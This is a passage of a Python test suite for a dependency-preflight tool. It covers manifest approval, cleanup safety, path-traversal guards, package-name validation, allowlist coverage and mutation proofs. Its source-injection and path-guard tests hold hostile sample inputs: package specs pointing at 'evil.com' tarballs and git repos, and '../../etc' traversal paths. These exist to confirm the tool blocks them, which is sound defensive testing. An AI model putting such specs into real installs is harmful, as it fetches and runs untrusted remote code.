        reg_path.parent.mkdir(parents=True, exist_ok=True)
        # project_b doesn't exist on disk
        registry = {
            "registryVersion": 1,
            "installs": [{"package": "old-lib", "version": "1.0",
                          "project": str(tmp_path / "nonexistent_project"), "branch": "main",
                          "source": "pypi", "scope": "project-local",
                          "classification": "build-time", "installedAt": "2026-01-01",
                          "used": True}],
        }
        reg_path.write_text(json.dumps(registry), encoding="utf-8")

        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        cleanup = result.get("cleanup", [])
        old_lib_entries = [c for c in cleanup if c["package"] == "old-lib"]
        # Missing project → conservative → NOT safe to remove
        assert old_lib_entries, "old-lib should appear in cleanup report"
        assert old_lib_entries[0]["safe_to_remove"] is False

    def test_cleanup_not_safe_when_another_project_needs_it(
        self, repo: Path, fake_home: Path, tmp_path: Path
    ):
        reg_path = fake_home / ".kata" / "installed-registry.json"
        reg_path.parent.mkdir(parents=True, exist_ok=True)
        # project_b still needs 'shared-lib'
        project_b = tmp_path / "project_b"
        project_b.mkdir()
        (project_b / "kata.dependencies.json").write_text(
            json.dumps({"dependencies": [{"package": "shared-lib", "version": "2.0"}]}),
            encoding="utf-8",
        )
        registry = {
            "registryVersion": 1,
            "installs": [{"package": "shared-lib", "version": "2.0",
                          "project": str(project_b), "branch": "main",
                          "source": "pypi", "scope": "project-local",
                          "classification": "build-time", "installedAt": "2026-01-01",
                          "used": True}],
        }
        reg_path.write_text(json.dumps(registry), encoding="utf-8")

        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        cleanup = result.get("cleanup", [])
        shared_lib_entries = [c for c in cleanup if c["package"] == "shared-lib"]
        assert shared_lib_entries
        assert shared_lib_entries[0]["safe_to_remove"] is False


# ---------------------------------------------------------------------------
# run_preflight — preflight.json written / gate_status round-trip
# ---------------------------------------------------------------------------

class TestPreflightJsonOutput:
    """PLAN: emit .kata/preflight.json (N3 schema); gate_status reads it."""

    def test_ready_result_written_to_disk(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "ready"
        assert pf.gate_status(repo) == "ready"

    def test_blocked_result_written_to_disk(self, repo: Path, fake_home: Path):
        mp = _write_manifest(repo, [])
        ap = repo / ".kata" / "kata.freeze-approval.json"
        ap.parent.mkdir(parents=True, exist_ok=True)
        ap.write_text(json.dumps({"manifestHash": "bad" * 16}), encoding="utf-8")
        pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert pf.gate_status(repo) == "blocked"

    def test_n3_schema_fields_present(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner(default=(0, "ok"))  # verify passes
        pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        data = json.loads((repo / ".kata" / "preflight.json").read_text(encoding="utf-8"))
        for field in ("status", "deps", "installed", "targetEnv", "warnings", "blockers", "sandbox"):
            assert field in data, f"N3 schema field missing: {field!r}"


# ---------------------------------------------------------------------------
# run_preflight — CWE-23 path guard
# ---------------------------------------------------------------------------

class TestPathGuard:
    """PLAN: `..`-guard every operator-supplied path (CWE-23)."""

    def test_dotdot_repo_root_raises(self, fake_home: Path):
        with pytest.raises(ValueError, match="'\\.\\.'"):
            pf.run_preflight("../../etc", home_dir=fake_home)

    def test_dotdot_home_dir_raises(self, repo: Path):
        with pytest.raises(ValueError, match="'\\.\\.'"):
            pf.run_preflight(repo, home_dir="../../etc")

    def test_dotdot_approved_hash_path_raises(self, repo: Path, fake_home: Path):
        with pytest.raises(ValueError, match="'\\.\\.'"):
            pf.run_preflight(repo, home_dir=fake_home, approved_hash_path="../../evil.json")


# ---------------------------------------------------------------------------
# BLOCKER 1: per-manager package-name grammar (source-injection prevention)
# ---------------------------------------------------------------------------

class TestSourceInjectionBlocked:
    """BLOCKER 1: ``package`` values that are source specs must be blocked per-manager.

    A value like ``https://evil.com/m.tgz`` or ``git+https://evil/repo.git``
    is a POSITIONAL SOURCE that pip/npm will fetch, ignoring the forced
    ``--index-url`` / ``--registry``.  The ``--`` separator does NOT stop this
    (it is a source spec, not a flag).
    """

    # --- pip / uv -------------------------------------------------------

    def test_url_package_pip_blocked(self):
        """https:// URL as pip package → rejected before any argv is built."""
        dep = {"manager": "pip", "package": "https://evil.com/m.tgz", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_git_plus_pip_blocked(self):
        """git+https:// as pip package → rejected."""
        dep = {"manager": "pip", "package": "git+https://evil.com/repo.git", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_url_package_uv_blocked(self):
        """https:// URL as uv package → rejected."""
        dep = {"manager": "uv", "package": "https://evil.com/m.tgz", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_colon_slash_pip_blocked(self):
        """foo:bar (colon) in pip package → rejected."""
        dep = {"manager": "pip", "package": "foo:bar", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_path_slash_pip_blocked(self):
        """a/b/c (slash, non-npm) in pip package → rejected."""
        dep = {"manager": "pip", "package": "a/b/c", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    # --- npm ------------------------------------------------------------

    def test_git_plus_npm_blocked(self):
        """git+https:// as npm package → rejected."""
        dep = {"manager": "npm", "package": "git+https://evil.com/repo.git", "version": "1.0.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_url_package_npm_blocked(self):
        """https:// URL as npm package → rejected."""
        dep = {"manager": "npm", "package": "https://evil.com/m.tgz", "version": "1.0.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_multiple_slashes_npm_blocked(self):
        """scope/pkg/evil (>1 path segment, no leading @) as npm package → rejected."""
        dep = {"manager": "npm", "package": "scope/pkg/evil", "version": "1.0.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    # --- cargo ----------------------------------------------------------

    def test_colon_cargo_blocked(self):
        """foo:bar (colon) in cargo package → rejected."""
        dep = {"manager": "cargo", "package": "foo:bar", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    def test_slash_cargo_blocked(self):
        """a/b (slash) in cargo package → rejected."""
        dep = {"manager": "cargo", "package": "a/b", "version": "1.0"}
        with pytest.raises(ValueError):
            pf._build_argv(dep, None)

    # --- Valid names must still pass ------------------------------------

    def test_valid_pip_name_passes(self):
        """pip: plain package name → passes."""
        dep = {"manager": "pip", "package": "requests", "version": "2.31.0"}
        argv = pf._build_argv(dep, None)
        assert "requests==2.31.0" in argv

    def test_valid_pip_extras_pass(self):
        """pip: package with extras bracket → passes (PEP-508 extras are not source specs)."""
        dep = {"manager": "pip", "package": "requests[security]", "version": "2.31.0"}
        argv = pf._build_argv(dep, None)
        assert "requests[security]==2.31.0" in argv

    def test_valid_npm_name_passes(self):
        """npm: plain package name → passes."""
        dep = {"manager": "npm", "package": "lodash", "version": "4.17.21"}
        argv = pf._build_argv(dep, None)
        assert "lodash@4.17.21" in argv

    def test_valid_npm_scoped_passes(self):
        """npm: scoped @scope/pkg → passes."""
        dep = {"manager": "npm", "package": "@scope/pkg", "version": "1.0.0"}
        argv = pf._build_argv(dep, None)
        assert "@scope/pkg@1.0.0" in argv

    def test_valid_cargo_name_passes(self):
        """cargo: hyphenated crate name → passes."""
        dep = {"manager": "cargo", "package": "serde-json", "version": "1.0.0"}
        argv = pf._build_argv(dep, None)
        assert "serde-json" in argv

    # --- End-to-end: evil URL package → blocked, runner NEVER called ----

    def test_e2e_evil_url_package_blocked_runner_never_called(
        self, repo: Path, fake_home: Path
    ):
        """End-to-end: manifest with evil URL package → run_preflight → blocked;
        the runner is NEVER called (zero invocations assert)."""
        evil_dep = {
            "name": "evil-pkg",
            "manager": "pip",
            "package": "https://evil.com/m.tgz",
            "version": "1.0",
            "verify": "python -c 'import evil'",
            "source": "pypi",
            "scope": "project-local",
            "classification": "build-time",
        }
        mp, ap = _setup_repo(repo, [evil_dep])
        runner = _TrackingRunner()
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            snyk_check=lambda p, v: True, sandbox_check=lambda: True,
        )
        assert result["status"] == "blocked"
        assert runner.calls == [], (
            f"runner must NEVER be called with evil URL package, got: {runner.calls}"
        )


# ---------------------------------------------------------------------------
# MAJOR 2: approval artifact default path (repo root, not .kata/)
# ---------------------------------------------------------------------------

class TestApprovalPathDefault:
    """MAJOR 2: freeze approval artifact defaults to repo root, not ``.kata/``."""

    def test_default_approval_path_at_repo_root(self, repo: Path, fake_home: Path):
        """Without ``approved_hash_path=`` kwarg, engine looks at
        ``repo_root/kata.freeze-approval.json`` (repo root, not ``.kata/``)."""
        mp = _write_manifest(repo, [])
        # Write approval at repo root (new default location)
        ap = repo / "kata.freeze-approval.json"
        _write_freeze_approval(ap, mp)
        # No approved_hash_path kwarg → default → should find the repo-root artifact
        result = pf.run_preflight(repo, home_dir=fake_home)
        assert result["status"] == "ready"

    def test_approval_in_kata_dir_is_not_default(self, repo: Path, fake_home: Path):
        """Without kwarg, ``.kata/kata.freeze-approval.json`` is NOT the default → blocked."""
        mp = _write_manifest(repo, [])
        # Write approval only in .kata/ (old default location — no longer the default)
        ap_old = repo / ".kata" / "kata.freeze-approval.json"
        _write_freeze_approval(ap_old, mp)
        # No kwarg → new default is repo root → approval NOT found there → blocked
        result = pf.run_preflight(repo, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert any("approval" in b.lower() or "freeze" in b.lower() for b in result["blockers"])


# ---------------------------------------------------------------------------
# MINOR 3: Snyk fail-closed when scan_required:true and no scanner wired
# ---------------------------------------------------------------------------

class TestSnykFailClosed:
    """MINOR 3: scan_required:true + no snyk_check callable → blocked with clear reason."""

    def test_no_scanner_wired_scan_required_blocks(self, repo: Path, fake_home: Path):
        """scan_required (default True) + no snyk_check → blocked with 'scanner not wired'."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        # verify fails → would reach snyk gate → blocked (no scanner wired)
        runner = _TrackingRunner([(1, "absent")])
        result = pf.run_preflight(
            repo, runner=runner, approved_hash_path=ap, home_dir=fake_home,
            sandbox_check=lambda: True,
            # snyk_check NOT provided — should be fail-closed
        )
        assert result["status"] == "blocked"
        assert any(
            "scanner not wired" in b.lower()
            or "snyk_check" in b.lower()
            or "sca" in b.lower()
            for b in result["blockers"]
        ), f"Expected scanner-not-wired blocker, got: {result['blockers']}"
        # Only the verify call should have been made; no install attempt
        assert len(runner.calls) == 1

    def test_no_scanner_scan_not_required_proceeds(self, repo: Path, fake_home: Path):
        """scan_required:false + no snyk_check → explicit opt-out → install proceeds."""
        mp, ap = _setup_repo(repo, [_PIP_DEP])
        runner = _TrackingRunner([(1, "absent"), (0, "ok"), (0, "ok")])
        cfg = {"preflight": {"allowed_registries": list(pf.ALLOWED_MANAGERS),
                              "scan_required": False, "sandbox_required": False}}
        result = pf.run_preflight(
            repo, kata_config=cfg, runner=runner,
            approved_hash_path=ap, home_dir=fake_home,
            sandbox_check=lambda: True,
            # snyk_check NOT provided; scan_required:False is the explicit opt-out
        )
        assert result["status"] == "ready"


# ---------------------------------------------------------------------------
# Mutation proof — run at the END of this module
# ---------------------------------------------------------------------------

def test_mutation_prove_non_vacuous():
    """Prove the H1 leading-dash guard in ``_validate_package`` bites.

    Uses mutation_run.prove_non_vacuous (tools/mutation_run.py:63).
    Line mutated: the ``if package.startswith("-"):`` guard in ``_validate_package``.
    Without this guard, ``--editable`` passes the pip name-grammar regex
    (``-`` is in ``[A-Za-z0-9._-]``) and no ValueError is raised.
    """
    import sys
    from pathlib import Path as _Path
    import mutation_run

    source = str(_Path(__file__).resolve().parent.parent / "kata_preflight.py")
    # Guard is now in _validate_package, not _validate_field_value (BLOCKER 1 move).
    asserted_line = '    if package.startswith("-"):'
    test_cmd = (
        f'cd "{_Path(__file__).resolve().parent.parent}" && '
        f'{sys.executable} -m pytest tests/test_kata_preflight.py::TestArgvBuilder::test_leading_dash_package_raises -q'
    )
    verdict = mutation_run.prove_non_vacuous(source, asserted_line, test_cmd)
    assert verdict["testWentRed"], (
        "Mutation should have made the leading-dash test go red — guard is not biting"
    )
    assert verdict["nonVacuous"], (
        "Test must be non-vacuous: it must catch the removal of the leading-dash guard"
    )


def test_mutation_prove_colon_guard():
    """Prove the per-manager name-grammar guard in ``_validate_package`` bites.

    Line mutated: ``if not pkg_re.fullmatch(package):``.
    The colon-only attack vector ``foo:bar`` passes all universal checks
    (no ``://``, no ``git+``, no ``http``, no ``..``, no leading ``-``) but is
    caught ONLY by the per-manager regex (``:``) is not in any manager's grammar).
    Removing the regex guard allows ``foo:bar`` through → test goes red.
    """
    import sys
    from pathlib import Path as _Path
    import mutation_run

    source = str(_Path(__file__).resolve().parent.parent / "kata_preflight.py")
    asserted_line = '    if not pkg_re.fullmatch(package):'
    test_cmd = (
        f'cd "{_Path(__file__).resolve().parent.parent}" && '
        f'{sys.executable} -m pytest '
        f'"tests/test_kata_preflight.py'
        f'::TestSourceInjectionBlocked::test_colon_slash_pip_blocked" -q'
    )
    verdict = mutation_run.prove_non_vacuous(source, asserted_line, test_cmd)
    assert verdict["testWentRed"], (
        "Mutation should make the colon-package test go red — regex guard is not biting"
    )
    assert verdict["nonVacuous"], (
        "Test must be non-vacuous: it must catch removal of the per-manager regex guard"
    )


# ===========================================================================
# Context-autonomy CA-P0 / E4 — DESIGN §1 Leg F (CA-L24..L26, CA-L15/L17, CA-L25)
# ===========================================================================

# A run context that covers all five frozen allowlist classes.
_COVERED_CONTEXT = {
    "verify_command": "pytest -q",
    "install_managers": ["pip", "uv"],
    "harness_home": "/opt/harness",
}
# A host allowlist that positively covers every one of the five classes.
_COVERING_ALLOWLIST = [
    "git commit",           # git-plumbing
    "pytest -q",            # verify-command
    "pip install",          # dependency-installs
    ".kata write",          # bridge-and-target-writes
    "/opt/harness/tools/x",  # harness-tools
]


class TestAllowlistCoverage:
    """CA-L26 — a FIXED checklist over the five frozen run-critical pattern classes."""

    def test_exactly_five_classes_pin(self):
        # Anti-cathedral guard: adding a sixth entry to the frozenset breaks this.
        assert len(pf.ALLOWLIST_CLASSES) == 5
        ids = {cid for cid, _desc in pf.ALLOWLIST_CLASSES}
        assert ids == {
            "git-plumbing",
            "verify-command",
            "dependency-installs",
            "bridge-and-target-writes",
            "harness-tools",
        }

    def test_all_covered_yields_no_warnings(self):
        warns = pf.check_allowlist_coverage(_COVERING_ALLOWLIST, _COVERED_CONTEXT)
        assert warns == []

    def test_empty_allowlist_warns_every_class(self):
        warns = pf.check_allowlist_coverage([], _COVERED_CONTEXT)
        assert len(warns) == 5
        assert all(w["severity"] == "warn" for w in warns)
        assert {w["class"] for w in warns} == {
            "git-plumbing",
            "verify-command",
            "dependency-installs",
            "bridge-and-target-writes",
            "harness-tools",
        }
        # Deterministic ordering (sorted by class id).
        assert [w["class"] for w in warns] == sorted(w["class"] for w in warns)

    def test_none_allowlist_is_conservative_not_permissive(self):
        # None ⇒ treated as empty ⇒ MORE warnings (never a silent "assume covered").
        warns = pf.check_allowlist_coverage(None, _COVERED_CONTEXT)
        assert len(warns) == 5

    @pytest.mark.parametrize(
        "drop_pattern,expected_class",
        [
            ("git commit", "git-plumbing"),
            ("pytest -q", "verify-command"),
            ("pip install", "dependency-installs"),
            (".kata write", "bridge-and-target-writes"),
            ("/opt/harness/tools/x", "harness-tools"),
        ],
    )
    def test_each_class_missing_yields_exactly_its_warn(self, drop_pattern, expected_class):
        allowlist = [p for p in _COVERING_ALLOWLIST if p != drop_pattern]
        warns = pf.check_allowlist_coverage(allowlist, _COVERED_CONTEXT)
        assert len(warns) == 1, f"expected exactly one warn, got {warns!r}"
        assert warns[0]["class"] == expected_class
        assert warns[0]["severity"] == "warn"
        # detail is the frozen human description for that class.
        expected_detail = dict(pf.ALLOWLIST_CLASSES)[expected_class]
        assert warns[0]["detail"] == expected_detail

    def test_verify_command_absent_is_vacuously_covered(self):
        # No verify command declared ⇒ nothing to cover ⇒ no verify warn.
        ctx = {"install_managers": ["pip"], "harness_home": "/opt/harness"}
        allowlist = ["git commit", "pip install", ".kata", "/opt/harness/tools"]
        warns = pf.check_allowlist_coverage(allowlist, ctx)
        assert not any(w["class"] == "verify-command" for w in warns)


class TestReadHostAutocompact:
    """CA-L15/L17 + GROUNDING G1 — env-var precedence, never writes, fail-closed enabled."""

    def _write_settings(self, tmp_path: Path, data: dict) -> Path:
        p = tmp_path / "settings.json"
        p.write_text(json.dumps(data), encoding="utf-8")
        return p

    def test_settings_window_and_enabled(self, tmp_path: Path):
        p = self._write_settings(
            tmp_path, {"autoCompactEnabled": True, "autoCompactWindow": 200000}
        )
        out = pf.read_host_autocompact(p, {})
        assert out["auto_compact_enabled"] is True
        assert out["window_tokens"] == 200000
        assert out["source"] == "settings"

    def test_env_wins_over_settings(self, tmp_path: Path):
        p = self._write_settings(
            tmp_path, {"autoCompactEnabled": True, "autoCompactWindow": 200000}
        )
        out = pf.read_host_autocompact(
            p, {"CLAUDE_CODE_AUTO_COMPACT_WINDOW": "800000"}
        )
        assert out["window_tokens"] == 800000
        assert out["source"] == "env"

    def test_disabled_is_read(self, tmp_path: Path):
        p = self._write_settings(tmp_path, {"autoCompactEnabled": False})
        out = pf.read_host_autocompact(p, {})
        assert out["auto_compact_enabled"] is False

    def test_absent_enabled_key_defaults_true(self, tmp_path: Path):
        # Readable object, key absent ⇒ host default enabled (G1) — a resolved bool.
        p = self._write_settings(tmp_path, {"autoCompactWindow": 150000})
        out = pf.read_host_autocompact(p, {})
        assert out["auto_compact_enabled"] is True

    def test_unreadable_file_is_none_unknown_not_a_default_bool(self, tmp_path: Path):
        p = tmp_path / "settings.json"
        p.write_text("{ not valid json", encoding="utf-8")
        out = pf.read_host_autocompact(p, {})
        assert out["auto_compact_enabled"] is None  # never a silent True/False

    def test_missing_file_is_none_unknown(self, tmp_path: Path):
        out = pf.read_host_autocompact(tmp_path / "nope.json", {})
        assert out["auto_compact_enabled"] is None
        assert out["window_tokens"] is None
        assert out["source"] == "none"

    def test_env_window_survives_unreadable_settings(self, tmp_path: Path):
        p = tmp_path / "settings.json"
        p.write_text("garbage", encoding="utf-8")
        out = pf.read_host_autocompact(
            p, {"CLAUDE_CODE_AUTO_COMPACT_WINDOW": "500000"}
        )
        assert out["auto_compact_enabled"] is None
        assert out["window_tokens"] == 500000
        assert out["source"] == "env"

    def test_non_bool_enabled_is_none(self, tmp_path: Path):
        p = self._write_settings(tmp_path, {"autoCompactEnabled": "yes"})
        out = pf.read_host_autocompact(p, {})
        assert out["auto_compact_enabled"] is None

    def test_invalid_env_falls_back_to_settings(self, tmp_path: Path):
        p = self._write_settings(tmp_path, {"autoCompactWindow": 120000})
        out = pf.read_host_autocompact(
            p, {"CLAUDE_CODE_AUTO_COMPACT_WINDOW": "not-a-number"}
        )
        assert out["window_tokens"] == 120000
        assert out["source"] == "settings"

    def test_read_never_writes(self, tmp_path: Path):
        p = self._write_settings(tmp_path, {"autoCompactEnabled": True})
        before = p.read_bytes()
        pf.read_host_autocompact(p, {"CLAUDE_CODE_AUTO_COMPACT_WINDOW": "300000"})
        assert p.read_bytes() == before  # pure read — no mutation


class TestStrandingVerdict:
    """CA-L25 — walk-away + full stranding = block; attended = warn; fail-closed inputs."""

    def test_walk_away_full_stranding_blocks(self):
        assert pf.stranding_verdict(
            walk_away=True, auto_compact_enabled=False,
            gauge_present=False, respawn_path="",
        ) == "block"

    def test_attended_full_stranding_warns(self):
        assert pf.stranding_verdict(
            walk_away=False, auto_compact_enabled=False,
            gauge_present=False, respawn_path="",
        ) == "warn"

    def test_attended_never_blocks(self):
        # Even fully stranded, an attended run WARNs (proceeds), never blocks.
        v = pf.stranding_verdict(
            walk_away=False, auto_compact_enabled=False,
            gauge_present=False, respawn_path="",
        )
        assert v != "block"

    @pytest.mark.parametrize(
        "auto_compact,gauge,respawn",
        [
            (True, False, ""),        # host backstop present
            (False, True, ""),        # gauge present
            (False, False, "/tmp/x"),  # respawn path present
        ],
    )
    def test_any_recovery_leg_present_is_ok(self, auto_compact, gauge, respawn):
        assert pf.stranding_verdict(
            walk_away=True, auto_compact_enabled=auto_compact,
            gauge_present=gauge, respawn_path=respawn,
        ) == "ok"

    def test_whitespace_respawn_counts_as_no_respawn(self):
        # A whitespace-only respawn path is "no respawn path" (stripped).
        assert pf.stranding_verdict(
            walk_away=True, auto_compact_enabled=False,
            gauge_present=False, respawn_path="   ",
        ) == "block"

    @pytest.mark.parametrize(
        "kwargs",
        [
            dict(walk_away=None, auto_compact_enabled=False, gauge_present=False, respawn_path=""),
            dict(walk_away=True, auto_compact_enabled=None, gauge_present=False, respawn_path=""),
            dict(walk_away=True, auto_compact_enabled=False, gauge_present=None, respawn_path=""),
            dict(walk_away=True, auto_compact_enabled=False, gauge_present=False, respawn_path=None),
            # bool-lookalikes must also be refused (strict typing).
            dict(walk_away=1, auto_compact_enabled=False, gauge_present=False, respawn_path=""),
        ],
    )
    def test_absent_or_wrong_type_input_raises(self, kwargs):
        with pytest.raises(ValueError):
            pf.stranding_verdict(**kwargs)


class TestBundleAuditEvent:
    """CA-L24/L28 — additive bundle audit key on every emitted preflight.json."""

    def test_bundle_present_and_round_trips(self, repo: Path, fake_home: Path):
        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert "bundle" in result
        data = json.loads((repo / ".kata" / "preflight.json").read_text(encoding="utf-8"))
        assert data["bundle"] == {
            "autoCompactChecked": None,
            "backstopRecommendation": None,
            "allowlistWarnings": None,
            "premiumGate": None,
            "hostSettingsWriteSlot": None,
        }

    def test_bundle_present_on_blocked_path(self, repo: Path, fake_home: Path):
        # Even an early blocked bailout carries the additive audit key.
        _, ap = _setup_repo_raw(repo, {"deps": []})  # malformed shape → blocked
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "blocked"
        assert "bundle" in result

    def test_existing_status_keys_unchanged(self, repo: Path, fake_home: Path):
        # BC canary: the additive key does not disturb existing behavior.
        mp, ap = _setup_repo(repo, [])
        result = pf.run_preflight(repo, approved_hash_path=ap, home_dir=fake_home)
        assert result["status"] == "ready"
        assert pf.gate_status(repo) == "ready"


# ---------------------------------------------------------------------------
# CA-P0 / E4 mutation proofs (≥3): disable → named test RED → revert.
# ---------------------------------------------------------------------------

def _prove(asserted_line: str, test_node: str) -> dict:
    import sys
    from pathlib import Path as _Path
    import mutation_run

    source = str(_Path(__file__).resolve().parent.parent / "kata_preflight.py")
    test_cmd = (
        f'cd "{_Path(__file__).resolve().parent.parent}" && '
        f'{sys.executable} -m pytest "tests/test_kata_preflight.py::{test_node}" -q'
    )
    return mutation_run.prove_non_vacuous(source, asserted_line, test_cmd)


def test_mutation_prove_stranding_and_conjunction():
    """Prove the AND-conjunction backstop leg bites (flip/drop → RED).

    Removing the ``auto_compact_enabled`` conjunct drops the backstop leg from the
    stranding AND, so a walk-away run WITH the host backstop enabled (the only
    recovery leg) is wrongly marked stranded → ``block`` instead of ``ok``.
    """
    verdict = _prove(
        "    stranded = stranded and (not auto_compact_enabled)  # backstop leg",
        "TestStrandingVerdict::test_any_recovery_leg_present_is_ok[True-False-]",
    )
    assert verdict["testWentRed"], "backstop-leg conjunct is not biting"
    assert verdict["nonVacuous"]


def test_mutation_prove_walk_away_discriminator():
    """Prove the walk-away discriminator bites.

    Removing the walk-away BLOCK return makes a walk-away full-stranding run fall
    through to the attended ``warn`` path → the block test goes RED.
    """
    verdict = _prove(
        '        return "block" if stranded else "ok"',
        "TestStrandingVerdict::test_walk_away_full_stranding_blocks",
    )
    assert verdict["testWentRed"], "walk-away discriminator is not biting"
    assert verdict["nonVacuous"]


def test_mutation_prove_five_class_enumeration():
    """Prove the five-class enumeration bites.

    Removing one frozen class from ``ALLOWLIST_CLASSES`` drops it from the empty
    allowlist's warning set → the "warns every class" test goes RED.
    """
    verdict = _prove(
        '    ("harness-tools", "invocation of the harness tools (python/uv run on <harness_home>/tools/*)"),',
        "TestAllowlistCoverage::test_empty_allowlist_warns_every_class",
    )
    assert verdict["testWentRed"], "five-class enumeration is not load-bearing"
    assert verdict["nonVacuous"]
